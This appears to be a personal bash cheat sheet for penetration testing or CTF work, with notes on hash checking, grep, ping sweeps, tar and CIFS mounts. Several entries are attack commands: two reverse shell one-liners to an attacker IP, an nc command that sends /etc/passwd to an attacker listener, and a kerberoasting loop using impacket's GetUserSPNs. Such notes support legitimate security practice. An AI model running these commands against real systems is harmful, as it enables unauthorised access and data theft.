# bash

### diff a file hash with its published value

`diff <(shasum -a 256 /path/to/file.ext) <(echo "published_sha256_value")`

use something like `... | sed 's/ .*$//'` to strip the extraneous info from the shasum cmd. Add info to the end of the published value to test.

`diff <(shasum -a 256 /path/to/file.ext | sed 's/ .*$//') <(echo "published_sha256_value")`

### carve a range of files by exact beginning and end

`ls -lh | grep "some_logs.log" | grep -E "1[3-9].gz|2[0-6].gz"`

Lists only `some_logs_13.gz` to `some_logs_26.gz`. Pipe that into whatever to do whatever.

### find hashes (hex) from output

`grep -a [a-f0-9]\{32\}`

Pipe output from things like `strings` here to finds hashes. The above will work for all hashes that are 32 characters or greater (md5, sha256, etc). Not perfect; will catch any string that matches the pattern, not just hashes. Adapt as needed. To find sha256 you could do

`grep -a [a-f0-9]\{64\}`

### reverse shell

`bash -i >& /dev/tcp/<attacker ip>/<listening port> 0>&1`

or if no `-e`

`mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f`

### do things to entires in IPs.txt
`for ip in `cat ips.txt`; do md5sum $ip; done >> something.txt`

### ippsec's scanner
```bash
#!/bin/bash
# by Ippsec https://www.youtube.com/watch?v=kE36IGAU5rg

for i in $(seq 2 225); do
    ping -c 1 -W 1 172.20.0.$i 1>/dev/null 2>&1
    if [[ $? -eq 0 ]];  then
          echo "172.20.0.$i - Online"
    fi
done
```
### grep for a string recursively in a dir
```bash
grep -r --include "*.h" "get_return_address" .
# --include "*.h" --> search files ending in .h
```
### exfil /etc/passwd (OR ANYTHING) with nc
```bash
# set up listner on attack box, port 31337. Direct output to exfil.txt
nc -nvlp 31337 > exfil.txt
# on the target, use
nc <attacker_ip_addr> 31337 < /etc/passwd # replace /etc/passwd with whatever file you want to try
```

### if your tool can't handle cidr notation, do it the hard way (ex: is a 10.10.0.0/16)
```bash
for i in $(seq 1 255); do echo "10.10.$i.1-255"; done | tr "\n" ","
```
### Mount a CIFS share with your Kerberos ticket on Linux 
```bash
sudo mount -t cifs -o "sec=krb5,cruid=$UID,user=Administrateur,domain=http://FOO.BAR" //AD1.FOO.BAR/C$ /mnt/test
```
### tar and untar a directory
```bash
tar -zcvf archive.tar.gz directory/;
tar -zxvf archive.tar.gz
```
### impacket scripts using a file containing a list of users (GetUserSPNs as an example)

```bash
for i in $(cat ~/path/to/user.list); do echo $i; ./GetUserSPNs.py -request -dc-ip 10.10.xx.xxx -no-pass -k domain.name/$i; sleep 5; done
```
